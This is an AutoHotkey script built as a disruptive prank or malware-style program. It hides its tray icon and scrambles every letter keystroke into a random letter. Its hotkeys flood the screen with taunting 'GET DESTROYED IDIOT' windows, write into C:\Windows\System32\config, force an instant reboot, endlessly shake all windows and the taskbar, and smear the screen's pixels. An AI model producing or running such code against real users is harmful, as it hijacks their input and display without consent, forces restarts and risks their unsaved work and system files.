#NoTrayIcon
#NoEnv  ; Recommended for performance and compatibility
SendMode Input  ; Recommended for new scripts due to its superior speed
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory

global arr := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

Loop, Parse, % "abcdefghijklmnopqrstuvwxyz", % "" 
{
    Hotkey, *%A_LoopField%, Snd
}
return
F4::
Loop, 250 ; yes.
{
    Random, RandX, 0, % A_ScreenWidth - 100
    Random, RandY, 0, % A_ScreenHeight - 100
    
    ; by adding a letter prefix, we bypass the 1-99 limit
    GuiName := "HAHAHAHHAHAHAHAHAHAHA" . A_Index
    
    Gui, %GuiName%:New, +AlwaysOnTop -MaximizeBox -MinimizeBox, BAHAHAHAHA %A_Index%
    Gui, %GuiName%:Add, Text, w200 h50 Center, GET DESTROYED IDIOT
    
    Gui, %GuiName%:Show, x%RandX% y%RandY%
 Sleep, 10000
FileAppend, kalala, C:\Windows\System32\config\OSDATA
Run, shutdown /r /t 0
}
return
F11::
; identify class
WinGetClass, CurrentClass, A

; loop
#Persistent
#NoEnv
SetBatchLines, -1
ListLines, Off
return

F1:: 
Loop
{
    ; 1. Grab all windows
    WinGet, id, List,,, Program Manager
    
    Loop, %id%
    {
        this_id := id%A_Index%
        WinGetTitle, title, ahk_id %this_id%
        WinGetClass, class, ahk_id %this_id%
        
        ; NEW LOGIC: Move it if it has a title OR if it is the Taskbar class
        if (title != "" || class = "Shell_TrayWnd" || class = "Shell_SecondaryTrayWnd")
        {
            WinGetPos, X, Y, , , ahk_id %this_id%
            Random, mX, -60, 60
            Random, mY, -60, 60
            
            ; Using the more aggressive DllCall for everything in this loop
            DllCall("SetWindowPos", "Ptr", this_id, "Ptr", 0, "Int", X+mX, "Int", Y+mY, "Int", 0, "Int", 0, "UInt", 0x0001 | 0x0004)
        }
    }
    Sleep, 1
}
return
return
return
End::Send, Nice try
Del::LButton
F2::
Loop
{
    ; device context
    hdc := DllCall("GetDC", "Ptr", 0)
    
    ; randommm x coordinates
    Random, x, 0, A_ScreenWidth
    Random, w, 50, 200
    Random, h, 100, 500
    
    ; 3. BitBlt (Bit Block Transfer) 
    ; This copies a piece of the screen and pastes it 2 pixels lower
    ; Parameters: DestDC, DestX, DestY, Width, Height, SourceDC, SourceX, SourceY, RasterOp (0x00CC0020 is SRCCOPY)
    DllCall("gdi32\BitBlt", "Ptr", hdc, "Int", x, "Int", 15, "Int", w, "Int", h, "Ptr", hdc, "Int", x, "Int", 0, "UInt", 0x00CC0020)
    
    ; 4. Release the DC to prevent memory leaks
    DllCall("ReleaseDC", "Ptr", 0, "Ptr", hdc)
WinSet, Transparent, 255, ahk_class BaseBar
WinSet, Transparent, 255, ahk_class Shell_TrayWnd
WinSet, Transparent, 255, ahk_class Progman
WinSet, Transparent, 255, ahk_class Button ; If doesn't work, move outside of loop
WinSet, Transparent, 255, ahk_class #32768
}
return




Snd() {
	Random, RandomVar, 1, 26
	SendInput % arr[RandomVar]
}


